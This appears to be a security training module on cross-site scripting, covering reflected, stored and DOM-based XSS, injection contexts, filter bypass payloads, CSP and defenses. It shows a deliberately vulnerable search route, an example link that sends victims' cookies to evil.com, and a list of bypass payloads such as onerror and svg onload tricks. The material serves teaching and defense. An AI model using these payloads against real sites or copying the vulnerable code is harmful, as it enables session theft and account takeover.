Module 12 — Cross-Site Scripting (XSS)

Master XSS attack vectors across different injection contexts and learn how browsers parse and execute injected code.

The Browser Is the Battleground

If SQL injection is breaking into the bank vault, Cross-Site Scripting (XSS) is tricking the bank teller into handing over money to the wrong person. XSS does not attack the server directly — it attacks other users by injecting malicious JavaScript into web pages they visit.

Here is why XSS is terrifying: JavaScript running in a user's browser has access to everything that user can see and do on the site. It can read their cookies, capture their keystrokes, modify the page content, make API requests on their behalf, redirect them to phishing pages, and even turn their browser into a proxy for further attacks. And the user has no idea any of this is happening — they just see a normal-looking web page.

XSS is the most commonly reported vulnerability in bug bounty programs after IDOR. It appears on virtually every web application that accepts and displays user input — which is virtually every web application, period.

The Three Types of XSS

Reflected XSS — The One-Shot Attack

In reflected XSS, the malicious script comes from the current HTTP request. The server takes user input from the URL or form data and includes it directly in the response without sanitization. The attack requires the victim to click a crafted link. 

# Server reflects input directly into HTML — VULNERABLE
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<h1>Results for: {query}</h1>"

# Attacker crafts a URL like:
# https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

When the victim clicks this link, the server reflects the script tag back in the HTML, and the victim's browser executes it. The script sends the victim's session cookie to the attacker's server. Game over.

"But wait," you might think, "who would click on a URL with <script> in it?" In practice, the URL is encoded (%3Cscript%3E), shortened with a URL shortener, or hidden behind a redirect. Most users never look at URLs before clicking.

Stored XSS — The Persistent Threat

Stored XSS is far more dangerous because the malicious script is permanently saved on the server — in a database, a comment field, a profile page, or anywhere user content is stored. Every user who views the page is affected, not just the one who clicked a special link.

Think about a forum where users post comments. If an attacker posts a comment containing JavaScript, and the forum displays that comment without sanitization, every person who views that thread gets the malicious script executed in their browser. One injection, thousands of victims.

Real Story — The Samy Worm (2005): Samy Kamkar created a stored XSS worm on MySpace that added "Samy is my hero" to every infected profile and then spread to that user's friends. In just 20 hours, it infected over 1 million users, making it the fastest-spreading virus of all time. MySpace had to take the entire site offline. Samy was sentenced to 3 years probation, community service, and was banned from using computers for a period. The worm was technically "harmless" (it just modified profiles), but it demonstrated the devastating power of stored XSS.

DOM-Based XSS — The Client-Side Trap

In DOM-based XSS, the vulnerability exists entirely in client-side JavaScript. The server never sees the malicious input — it is processed by JavaScript running in the browser. This makes DOM XSS harder to detect with server-side security tools. 

// VULNERABLE: innerHTML with untrusted data from URL fragment
var name = location.hash.slice(1);  // e.g., #<img src=x onerror=alert(1)>
document.getElementById('greeting').innerHTML = 'Welcome, ' + name + '!';

// SAFE: textContent treats everything as text, not HTML
document.getElementById('greeting').textContent = 'Welcome, ' + name + '!';

The key concept is sources and sinks. A "source" is where untrusted data enters the JavaScript (e.g., location.hash, location.search, document.referrer, window.name). A "sink" is where that data gets used in a dangerous way (e.g., innerHTML, eval(), document.write(), setTimeout() with a string argument). DOM XSS occurs when tainted data flows from a source to a sink without proper sanitization.

Injection Contexts — Where Your Input Lands Matters

The single most important concept in XSS is context. The same input might be harmless in one context and devastating in another. Where your input lands in the HTML determines which payloads will work and how you need to "escape" the current context:

This is why a simple "filter out <script> tags" approach never works. In an attribute context, you do not even need script tags — an event handler like onfocus=alert(1) is enough. In a JavaScript string context, you just need to close the string. Context-aware output encoding is the only reliable defense.

Filter Bypass Techniques

Many applications try to prevent XSS with blocklists — filtering out dangerous strings like <script>. This is like playing whack-a-mole. There are hundreds of ways to execute JavaScript in HTML, and blocking them all is practically impossible. Here are just a few:

  • Case variation: <ScRiPt>alert(1)</sCrIpT> — HTML tags are case-insensitive
  • Alternative tags: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, <body onload=alert(1)>, <details open ontoggle=alert(1)>
  • Nested tags: <scr<script>ipt>alert(1)</scr</script>ipt> — if the filter only removes one instance
  • Event handlers: onerror, onload, onfocus, onmouseover, onanimationstart, ontoggle — there are over 80 event handlers
  • Encoding tricks: HTML entities (&lt;), URL encoding (%3C), Unicode escapes (\u003c), hex encoding (<)
  • Template literals: In JavaScript context, alert`1` works without parentheses
The Lesson: Never try to write your own XSS filter. Use your framework's built-in output encoding (Django's template engine auto-escapes, React's JSX auto-escapes, etc.) and a battle-tested sanitization library like DOMPurify for cases where you need to allow some HTML.

What Can an Attacker Do with XSS?

XSS gives the attacker the ability to execute arbitrary JavaScript in the victim's browser, in the context of the vulnerable website. This means:

  • Session hijacking: Steal session cookies with document.cookie and impersonate the victim
  • Credential harvesting: Inject a fake login form that sends credentials to the attacker
  • Keylogging: Capture everything the user types on the page
  • CSRF token theft: Read anti-CSRF tokens and use them to perform actions as the victim
  • Phishing: Modify the page content to trick the user into entering sensitive data
  • Worm propagation: Automatically spread the XSS to other users (like the Samy worm)
  • Cryptocurrency mining: Use the victim's CPU to mine crypto
  • Browser exploitation: Use the XSS as a pivot to exploit browser vulnerabilities (BeEF framework)

Content Security Policy (CSP)

CSP is a browser-side defense mechanism that tells the browser which scripts are allowed to execute. It is set via an HTTP response header: 

Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

This policy says: only execute scripts from the same origin or from cdn.example.com. Inline scripts (like <script>alert(1)</script>) are blocked. This is a powerful defense — even if an attacker finds an XSS vulnerability, the browser will refuse to execute the injected script.

However, CSP is only as strong as its configuration. Common misconfigurations that weaken or bypass CSP:

  • 'unsafe-inline' — defeats the entire purpose of CSP by allowing inline scripts
  • 'unsafe-eval' — allows eval(), setTimeout('string'), etc.
  • data: URIs — allow <script src="data:text/javascript,alert(1)">
  • Overly broad whitelists — if *.google.com is allowed, JSONP endpoints on Google domains can be abused
  • Missing base-uri directive — allows injecting <base> tags to redirect script loads
Pro Tip: To evaluate a CSP policy, paste it into Google's CSP Evaluator tool. It will highlight weaknesses and suggest improvements. A strict CSP with nonce-based script loading is the gold standard.

Defense — The Right Way

The defense against XSS is layered:

  1. Context-aware output encoding: Encode user input based on where it appears in the HTML. HTML-encode for body text, attribute-encode for attribute values, JavaScript-encode for JS strings, URL-encode for URLs. Your template engine probably does this automatically — do not bypass it with |safe or dangerouslySetInnerHTML unless absolutely necessary.
  2. Content Security Policy: Deploy a strict CSP that blocks inline scripts and restricts script sources.
  3. HttpOnly cookies: Set the HttpOnly flag on session cookies so JavaScript cannot read them.
  4. Input validation: Reject input that does not match expected patterns. An email field should not contain < characters.
  5. DOMPurify: When you must render user-supplied HTML (rich text editors, markdown), use DOMPurify to sanitize it.
Remember: Output encoding is NOT the same as input validation. Validating input catches some attacks, but the definitive defense is encoding the output in the correct context. Even "safe" input like a username could contain < if someone's legal name includes it. Encode on output, always.
